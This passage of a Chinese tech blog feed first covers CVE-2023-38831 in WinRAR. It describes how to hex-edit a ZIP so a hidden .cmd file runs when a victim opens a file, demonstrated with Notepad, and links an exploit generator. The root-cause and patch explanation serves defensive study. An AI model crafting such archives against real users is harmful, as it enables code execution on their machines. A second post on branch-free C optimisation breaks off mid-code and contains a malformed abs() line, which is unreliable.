修改ZIP文件</h3><p>使用二进制编辑软件打开上述压缩文件，这里我使用的是WinHex。然后，将<code>FILE_NAME.xxxA</code>和<code>FILE_NAME.xxxB</code>中的<code>A</code>和<code>B</code>字符替换为<strong>空格</strong>（必须是空格！）：</p><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png"></p><h3 id="Step4-触发漏洞"><a href="#Step4-触发漏洞" class="headerlink" title="Step4 触发漏洞"></a>Step4 触发漏洞</h3><p>使用<code>WinRAR</code>打开压缩包并双击<code>FILE_NAME.xxx</code>文件，然后可以观察到恶意代码被执行（这里cmd里面仅打开了记事本）：</p><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png"></p><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png"></p><p>上述展示了手工生成poc的方法，下面链接提供了自动生成poc的脚本exp：</p><p><a href="https://github.com/b1tg/CVE-2023-38831-winrar-exploit/tree/main">b1tg/CVE-2023-38831-winrar-exploit: CVE-2023-38831 winrar exploit generator (github.com)</a></p><h2 id="3-漏洞原理"><a href="#3-漏洞原理" class="headerlink" title="3. 漏洞原理"></a>3. 漏洞原理</h2><ul><li><p>一句话根因描述：该漏洞主要利用了<code>WinRAR</code>解析过程中存在的同名前缀混淆问题和<code>ShellExecuteExW()</code></p></li><li><p>细节：</p><ul><li><code>sub_7FF7A7ADEBF4()</code>函数内<code>while</code>循环体内遍历压缩包中的所有文件，然后找到匹配项（ZIP界面选中时会有一个文件名，与之匹配）：</li></ul><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png"></p><ul><li><p><strong>漏洞触发的第一个条件，恶意代码被解压到本地</strong>：</p><p>由于上述的代码逻辑比较复杂，这里猜测上述的匹配仅检查公共前缀，如果公共前缀相同，则会进行解压。</p><ol><li>e.g. 假设压缩包选中的文件名为<code>A</code>，由于我们对压缩包的二进制数据进行修改，实际的文件名为<code>"A "</code>；</li><li>注意到由于我们的修改，导致压缩包中出现了同名文件（文件名为<code>"A "</code>和文件夹名为<code>"A "</code>，<strong>这在windows操作系统上是不允许的</strong>），在解压过程中，文件夹名为<code>"A "</code>与文件名<code>"A "</code>前缀相同，因此文件夹名为<code>"A "</code>的文件均会被解压到临时目录中 [ZIP压缩包二进制中存储的文件名为<code>"A \B"</code>, <code>"A \C"</code> etc.]；</li><li>因此，恶意的cmd文件也被<strong>错误</strong>的解压到临时目录中（<span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 这一点很关键）。</li></ol></li></ul><hr><ul><li><code>sub_7FF7A7B1609C</code>函数内执行解压后的文件：</li></ul><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png"></p><ul><li><p><strong>漏洞触发的第二个条件，恶意代码被执行</strong>：</p><p><code>WinRAR</code>使用<code>ShellExecuteExW</code>执行解压的文件，传入的文件名为<code>"A "</code>，也就是可以抽象称为<code>ShellExecuteExW()</code>调用了<code>file A</code>。</p><ol><li>由上述分析得知，文件<code>"A "</code>和文件夹内<code>"A "</code>的<strong>所有</strong>文件均已被解压到本地临时目录（这里需要额外注意一点，文件<code>"A "</code>的末尾空格是在后缀名之后，而Windows系统不允许文件名后有空格，因此在创建文件的时候，空格会被删除）；</li><li><code>ShellExecuteExW()</code>被调用是传入的文件路径为：<code>"临时目录路径\A "</code>。在寻找该文件的时候，由于<code>"A "</code>解压本地时文件名改为了<code>"A"</code>（空格被删除），因此<code>ShellExecuteExW()</code>实际上执行的是<code>"A .cmd"</code>，即执行了恶意代码；</li></ol><blockquote><p>这里的陷阱和WinExec的很相似，可以参考下面这篇文章中的安全备注</p><p><a href="https://learn.microsoft.com/zh-CN/windows/win32/api/winbase/nf-winbase-winexec">WinExec 函数 (winbase.h) - Win32 apps | Microsoft Learn</a></p></blockquote><ol start="3"><li>因此，恶意的cmd文件名<strong>必须</strong>是<code>"A .cmd"</code>，否则<code>ShellExecuteExW()</code>将无法被调用起来</li></ol></li></ul></li><li><p>综上所述，该漏洞触发<strong>必须满足两个条件</strong>：</p><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 通过修改压缩包二进制数据<strong>构造同名文件和同名文件夹名</strong>（正常情况下是不允许的）且必须<strong>以一个空格作为后缀</strong>，此做法的目的是将同名文件夹下的恶意文件解压到本地；</p><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 包含恶意代码文件名必须与步骤<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>中构造同名文件和同名文件夹名相同（包含空格），此做法保证<code>ShellExecuteExW()</code>执行的是恶意代码文件而不是解压的正确文件。</p></li></ul><h2 id="4-修复措施"><a href="#4-修复措施" class="headerlink" title="4. 修复措施"></a>4. 修复措施</h2><ul><li>将<code>WinRAR</code>更新到高于6.22的版本</li><li>不打开来源不明的压缩文件</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分支是如何影响代码性能的？</title>
    <link href="/2023/09/08/%E5%88%86%E6%94%AF%E6%98%AF%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D%E4%BB%A3%E7%A0%81%E6%80%A7%E8%83%BD/"/>
    <url>/2023/09/08/%E5%88%86%E6%94%AF%E6%98%AF%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D%E4%BB%A3%E7%A0%81%E6%80%A7%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="分支是如何影响代码性能的？"><a href="#分支是如何影响代码性能的？" class="headerlink" title="分支是如何影响代码性能的？"></a>分支是如何影响代码性能的？</h1><p>上周在ryf的公众号上发现一篇名为《How branches influence the performance of your code and what can you do about it?》<a href="https://johnnysswlab.com/how-branches-influence-the-performance-of-your-code-and-what-can-you-do-about-it/">[1]</a>的文章，讲述了代码分支（if语句）对于程序性能的影响。主要契机是在AFL源码的if语句中常常出现的<code>likely</code>和<code>unlikely</code>用法，所以这一篇文章就挺让我在意的，不过上周一直在整PE Parser，就没来得及去看。恰逢这周已经整完了PE Parser，故腾出时间来看一看这篇文章，并记录相关要点。</p><h2 id="1-CPU的一些特性"><a href="#1-CPU的一些特性" class="headerlink" title="1. CPU的一些特性"></a>1. CPU的一些特性</h2><ul><li>管线化（Pipeline）：<ul><li>这个概念和我们计网中学习流水线技术相似，对于CPU来说，这其实就是<strong>多条指令时间并行处理</strong>的技术</li></ul></li><li>乱序执行（Out of order execution）</li><li>预测执行（Speculative execution）<ul><li>预测分支的目的地</li><li>如果预测有误，则预测运行的结果将会清空</li></ul></li><li>分支预测（Branch prediction）<ul><li>分支预测器</li></ul></li></ul><h2 id="2-CPU如何影响分支"><a href="#2-CPU如何影响分支" class="headerlink" title="2. CPU如何影响分支"></a>2. CPU如何影响分支</h2><ul><li><p>为了保持最大化流水线并避免降速，处理器需要知道分支最终目的地址（甚至在处理器解码分支指令之前）</p></li><li><p>处理器可能的相关操作（与具体处理器设计有关）</p><ul><li><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 暂停流水线（stall the pipeline）并停止指令解码操作直到分支指令被解码且分支的目的地已知，然后将继续载入流水线执行正确的指令；</li><li><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 加载该分支后面的指令：<ul><li>如果之后在该分支处做出了错误的选择（i.e. 也就是说不执行该分支后面的指令，而是执行跳转的指令），那么处理器将清空流水线并开始载入正确的指令</li></ul></li><li><span class="github-emoji"><span>3⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 向分支预测期询问应该加载分支后面的指令还是分支跳转的目的地址的指令</li></ul><p>需要注意的是：主流的处理器一般不会进行<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 的操作，原因是<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 的操作开销过大；主流处理器一般会采用<span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>或<span class="github-emoji"><span>3⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>的方式进行处理，<span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>通常在低端嵌入式系统或低开销处理器中使用，<span class="github-emoji"><span>3⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>通常在桌面端或笔记本端的高性能CPU中使用<span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>。</p></li></ul><h3 id="无分支预测特性的CPU"><a href="#无分支预测特性的CPU" class="headerlink" title="无分支预测特性的CPU"></a>无分支预测特性的CPU</h3><ul><li>直接载入分支后面的指令</li><li>如果预测失败，则清空已加载的错误指令；因此，在不执行分支操作的情况下，该操作的成本最低</li><li>需要注意的是，由于无分支预测特性的CPU设计通常是简单的 ==&gt; 流水线较短，因此做出错误选择的惩罚并不是特别高</li></ul><h3 id="有分支预测特性的CPU"><a href="#有分支预测特性的CPU" class="headerlink" title="有分支预测特性的CPU"></a>有分支预测特性的CPU</h3><ul><li>如果CPU流水线很长，那么分支预测器预测失败所带了的影响就会很大 [体现在流水线上执行的错误指令将被清空]</li><li>分支预测的复杂性<ul><li>有一些分支很好预测</li><li>另一些分支很难预测</li></ul></li><li>说白了就是分支预测器进行分支推测，并预处理预测分支处的指令，如果预测成功，那将提高程序的运行速度，否则，将浪费资源在无用的指令上，因而带来额外的开销；<span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>换句话说，其性能完全取决于分支预测的成功率。</li></ul><h2 id="3-汇编概述"><a href="#3-汇编概述" class="headerlink" title="3. 汇编概述"></a>3. 汇编概述</h2><ul><li>假设我们的C代码片段如下所示：</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (p != nullptr) {<br>    transform(p);<br>} <span class="hljs-keyword">else</span> {<br>    invalid++;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><p>汇编包含两种指令，一种是比较指令，另外一种是跳转指令；上述C代码对应于下面的伪汇编程序：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    p_not_null = (p != nullptr)<br>    if_not (p_not_null) goto ELSE;<br>    transform(p);<br>    goto ENDIF;<br>ELSE:<br>    invalid++;<br>ENDIF:<br></code></pre></td></tr></tbody></table></figure><ul><li>汇编会评估原始C条件语句<code>p!=nullptr</code>，如果为<code>false</code>，则执行与<code>else</code>分支相对应的指令分支，否则，就执行与<code>if</code>分支主体相对应的指令</li><li>上述伪汇编还有一种等价形式：</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    p_not_null = (p != nullptr)<br>    if (p_not_null) goto IF:<br>    invalid++;<br>    goto ENDIF;<br>IF:<br>    transform(p);<br>ENDIF: <br></code></pre></td></tr></tbody></table></figure></li><li><p>虽然上面两种伪汇编是等价的，但是大多数编译器会形如第一个的汇编，开发者可以使用GCC builtins来影响这一决策；关键的见解<span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>是：<strong>在一些处理器上，顺序执行比跳转的开销要小很多，这样的话，告诉编译器如何结构化代码将会带来更好的性能</strong></p></li></ul><h2 id="4-分支和向量化"><a href="#4-分支和向量化" class="headerlink" title="4. 分支和向量化"></a>4. 分支和向量化</h2><ul><li><p>向量化：简单来说，其实就是现代的CPU有一些特殊的<strong>向量指令</strong>，这些向量指令能够处理超过一个同类型的数据，e.g. 有一个指令能够从内存中载入4个整数，一个指令能够做4次加法，另一个指令能够将4个结果存回内存</p></li><li><p>自动向量化（autovectorization）：向量化的好处是能够使运行速度变快。CPU的自动向量化会自动生成向量指令来加快运行速度</p></li><li><p>自动向量化的局限性（与分支有关）：</p><ul><li><pre><code class="c">for (int i = 0; i &lt; n; i++) {    if (a[i] &gt; 0) {        a[i]++;    } else {        a[i]--;    }}<figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">  *</span> 上述循环很难被向量化，原因在于数据本身的改变与数据值之间的关系<br><br><span class="hljs-section">## 5. 程序运行更快的技巧（:star:）</span><br><br><span class="hljs-bullet">*</span> 相关定义：<br><span class="hljs-bullet">  *</span> 定义1 <span class="hljs-strong">**条件概率**</span>：指的是条件为真的可能性<br><span class="hljs-bullet">    *</span> 具有分支预测的CPU能很快识别出哪一个条件很可能为真/假；当遇到很难预测的分支时，分支预测器将有50%正确预测的概率，而这些分支便有优化的潜力<br><span class="hljs-bullet">  *</span> 定义2 <span class="hljs-emphasis">*computational intensive*</span>, <span class="hljs-emphasis">*expensive*</span> or <span class="hljs-emphasis">*heavy condition*</span><br><span class="hljs-bullet">    *</span> 计算时需要很多的指令 or 需要参与计算的数据不在缓存（单个指令需要很多时间去完成）<br><br><span class="hljs-section">### 优化If/else命令链</span><br><br>假设有以下源代码：<br><br><span class="hljs-code">```c</span><br><span class="hljs-code">if (a &gt; 0) { </span><br><span class="hljs-code">    do_something();</span><br><span class="hljs-code">} else if (a == 0) { </span><br><span class="hljs-code">   do_something_else();</span><br><span class="hljs-code">} else {</span><br><span class="hljs-code">    do_something_yet_else();</span><br><span class="hljs-code">}</span><br></code></pre></td></tr></tbody></table></figure></code></pre></li></ul></li></ul><p>进一步假设（a &lt; 0）概率为70%；（a &gt; 0）概率为20%，（a == 0）概率为10%，那么我们可以重排上述代码中的顺序，具体来说，<strong>将触发概率高的条件越往前放置</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (a &lt; <span class="hljs-number">0</span>) {   <span class="hljs-comment">// 70 %</span><br>    do_something_yet_else();<br>} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a &gt; <span class="hljs-number">0</span>) {   <span class="hljs-comment">// 20 %</span><br>   do_something();<br>} <span class="hljs-keyword">else</span> {    <span class="hljs-comment">// 10 %</span><br>    do_something_else();<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="使用查找表而不是switch语句"><a href="#使用查找表而不是switch语句" class="headerlink" title="使用查找表而不是switch语句"></a>使用查找表而不是switch语句</h3><p>在删除分支时，查找表LUT偶尔会排上用场。虽然switch语句中的分支在大多数情况下都很容易预测，因而这种优化很可能不会带来任何效果。尽管如此，还是尽可能去做这种转换。假设有下述代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">switch</span>(day) {<br>    <span class="hljs-keyword">case</span> MONDAY: <span class="hljs-keyword">return</span> <span class="hljs-string">"Monday"</span>;<br>    <span class="hljs-keyword">case</span> TUESDAY: <span class="hljs-keyword">return</span> <span class="hljs-string">"Tuesday"</span>;<br>   ...<br>    <span class="hljs-keyword">case</span> SUNDAY: <span class="hljs-keyword">return</span> <span class="hljs-string">"Sunday"</span>;<br>    <span class="hljs-keyword">default</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;<br>};<br></code></pre></td></tr></tbody></table></figure><p>上述代码可以使用LUT进行实现：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (day &lt; MONDAY || day &gt; SUNDAY) <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;<br><span class="hljs-type">char</span>* days_to_string = { <span class="hljs-string">"Monday"</span>, <span class="hljs-string">"Tuesday"</span>, ... , <span class="hljs-string">"Sunday"</span> };<br><span class="hljs-keyword">return</span> days_to_string[day - MONDAY];<br></code></pre></td></tr></tbody></table></figure><p><strong>通常情况下</strong>编译器可能会为你完成上述操作，i.e.将switch语句转为一个查找表，</p><p>此外，GNU语言扩展中有一个叫<em>computed labels</em>的东西能够允许你实现存储<em>labels</em>的查找表，这个玩意对于实现解析器来说是很有用的，如：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">void</span>* days[] = { &amp;&amp;monday, &amp;&amp;tuesday, ..., &amp;&amp;sunday };<br>    <span class="hljs-keyword">goto</span> days[day];<br>monday:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"Monday"</span>;<br>tuesday:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"Tuesday"</span>;<br>...<br>sunday:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"Sunday"</span>;<br></code></pre></td></tr></tbody></table></figure><h3 id="将最常见的case移出switch"><a href="#将最常见的case移出switch" class="headerlink" title="将最常见的case移出switch"></a>将最常见的case移出switch</h3><p>R.T., e.g.：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">day <span class="hljs-title function_">get_first_workday</span><span class="hljs-params">()</span> {<br>     <span class="hljs-built_in">std</span>::chrono::weekday first_workday = read_first_workday();<br>    <span class="hljs-keyword">if</span> (first_workday == Monday) { <span class="hljs-keyword">return</span> day::Monday; }<br>    <span class="hljs-keyword">switch</span>(first_workday) { <br>        <span class="hljs-keyword">case</span> Tuesday: <span class="hljs-keyword">return</span> day::Tueasday;<br>        ....<br>    };<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="重写条件连结符"><a href="#重写条件连结符" class="headerlink" title="重写条件连结符"></a>重写条件连结符</h3><p>我们从一个例子引入此节的观点，假设有以下代码片段：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (a[i] &gt; x &amp;&amp; a[i] &lt; y) {<br>    do_something();<br>}<br></code></pre></td></tr></tbody></table></figure><p>从汇编角度来看：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">if_not (a[i] &gt; x) goto ENDIF;<br>if_not (a[i] &lt; y) goto ENDIF;<br>do_something;<br>ENDIF<br></code></pre></td></tr></tbody></table></figure><p>虽然 a[i] &gt; x 和 a[i] &lt; y 都是很容易计算的（所有数据都已经在寄存器或者缓存），但都很难预测。这里我们如果使用<code>&amp;</code>连结这两个条件，主要的作用有：</p><ol><li>强制将两个条件同时计算（将不会有<code>&amp;&amp;</code>的短路运算）</li><li>使条件更容易预测，因而会降低分支预测出错的概率：假设条件1与条件2概率均为50%，那么再使用<code>&amp;</code>连结符之后，整个分支为真的概率为25%</li><li>去掉一个分支</li></ol><p>相似的，将<code>||</code>替换为<code>|</code>也可以达到相同的目的</p><blockquote><p>PS: C++中bool类型0表示false，而其他任何数字表示true</p><p>C++标准保证逻辑操作符的结果和算术比较的结果总会为0或者1，但是并不保证所有bool都有这两类值的参与，因此如果需要标准化bool变量，需要<strong>应用<code>!!</code>符</strong>。（我们在阅读C类代码的时候，时常会看到<code>!!</code>的操作符，该操作符其实就是将结果标准化为bool变量）</p></blockquote><h3 id="告知编译器哪一个分支有更高的概率"><a href="#告知编译器哪一个分支有更高的概率" class="headerlink" title="告知编译器哪一个分支有更高的概率"></a>告知编译器哪一个分支有更高的概率</h3><p>GCC和Clang提供指示分支概率性的关键字：<code>__builtin_expect</code>，e.g.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> likely(x)      __builtin_expect(!!(x), 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlikely(x)    __builtin_expect(!!(x), 0)</span><br><span class="hljs-keyword">if</span> (likely(ptr)) {<br>    ptr-&gt;do_something();<br>}<br></code></pre></td></tr></tbody></table></figure><p>我们在阅读AFL源码的时候，也观察到AFL源码中if语句处大量使用了<code>likely(...)</code>、<code>unlikely(...)</code>语法，其目的就是对分支进行优化；</p><p>在底层，编译器会重排if/else分支语句所对应的指令，以便更有效地使用底层硬件。</p><blockquote><p>PS: 这里的见解其实我们在第3节中已经介绍过了，i.e.</p><p><strong>在一些处理器上，顺序执行比跳转的开销要小很多，这样的话，告诉编译器如何结构化代码将会带来更好的性能</strong></p><p>因此编译器根据用户定义的概率重排if/else语句将会带来更好的性能</p></blockquote><h3 id="使用无分支算法"><a href="#使用无分支算法" class="headerlink" title="使用无分支算法"></a>使用无分支算法</h3><p>简单来说这里其实使用了位运算来消除算法中的分支，e.g. 取绝对值函数<code>abs()</code>在计算某一个数的绝对值时，就用了一个trick：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">abs</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> {<br>  <span class="hljs-type">int</span> <span class="hljs-type">const</span> mask = <br>        a &gt;&gt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>) * CHAR_BIT - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span>  = (a + mask) ^ mask;<br>}<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 一些位运算的其他tricks可以参考这一篇文章<a href="https://graphics.stanford.edu/~seander/bithacks.html#CopyIntegerSign">Bit Twiddling Hacks (stanford.edu)</a></p><h3 id="使用条件载入取代分支"><a href="#使用条件载入取代分支" class="headerlink" title="使用条件载入取代分支"></a>使用条件载入取代分支</h3><p>假设有分支语句：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (x &gt; y) {<br>    x++;<br>}<br></code></pre></td></tr></tbody></table></figure><p>可以如下重写：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> new_x = x + <span class="hljs-number">1</span>;<br>x = (x &gt; y) ? new_x : x; <span class="hljs-comment">// the compiler should recognize this and emit a conditional branch</span><br></code></pre></td></tr></tbody></table></figure><p>这里第2行的语句可以被（<em>condition move</em> - cmov）指令进行优化，因此可以删除分支</p><h3 id="使用算术运算删除分支"><a href="#使用算术运算删除分支" class="headerlink" title="使用算术运算删除分支"></a>使用算术运算删除分支</h3><p>e.g.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// With branch</span><br><span class="hljs-keyword">if</span> (a &gt; b) {<br>    x += y;<br>}<br><span class="hljs-comment">// Branchless</span><br>x += -(a &gt; b) &amp; y; <br></code></pre></td></tr></tbody></table></figure><p>当a &gt; b为假时，-(a &gt; b) &amp; y为0；当a &gt; b为真时，-(a &gt; b) = -1 =&gt; -(a &gt; b) &amp; y = -1 &amp; y = y</p><p>另外一个例子：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// With branch</span><br>x = (a &gt; b) ? val_a : val_b;<br><span class="hljs-comment">// Branchless</span><br>x = val_a;<br>x += -(a &gt; b) &amp; (val_b - val_a);<br></code></pre></td></tr></tbody></table></figure><p>上述示例均使用了算术运算来避免分支，但根据CPU分支错误预测惩罚和数据缓存命中率，<strong>该做法可能会提高性能，可能也不会</strong>，请根据情况酌情使用（我们可以看出，这样做转化后，代码的可阅读性变差了）</p><p>最后是一个环形缓冲区的例子：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// With branch</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_next_element</span><span class="hljs-params">(<span class="hljs-type">int</span> current, <span class="hljs-type">int</span> buffer_len)</span> {<br>    <span class="hljs-type">int</span> next = current + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (next == buffer_len) {<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-keyword">return</span> next;<br>}<br><span class="hljs-comment">// Branchless</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_next_element_branchless</span><span class="hljs-params">(<span class="hljs-type">int</span> current, <span class="hljs-type">int</span> buffer_len)</span> {<br>    <span class="hljs-type">int</span> next = current + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> (next &lt; buffer_len) * next;<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="重组代码来避免分支"><a href="#重组代码来避免分支" class="headerlink" title="重组代码来避免分支"></a>重组代码来避免分支</h3><p>这种方式属于代码逻辑层面的重组，使用上较为灵活。下面以一个名为<code>animation</code>的类为例：</p><p>假设下述代码遍历<code>animation_list</code>中的每一个<code>animation</code>实例，并且根据实例是否可见来执行相应的成员方法：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 